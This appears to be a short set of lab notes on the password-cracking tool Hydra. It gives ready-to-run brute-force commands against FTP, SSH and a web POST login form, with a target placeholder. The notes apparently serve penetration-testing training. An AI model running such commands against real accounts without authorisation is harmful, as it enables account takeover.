# Hydra Commands

- The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

		hydra -l user -P passlist.txt ftp://MACHINE_IP

### SSH
	hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

### Post Web Form

- We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used.
- *You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.*

- Below is an example Hydra command to brute force a POST login form:

		hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
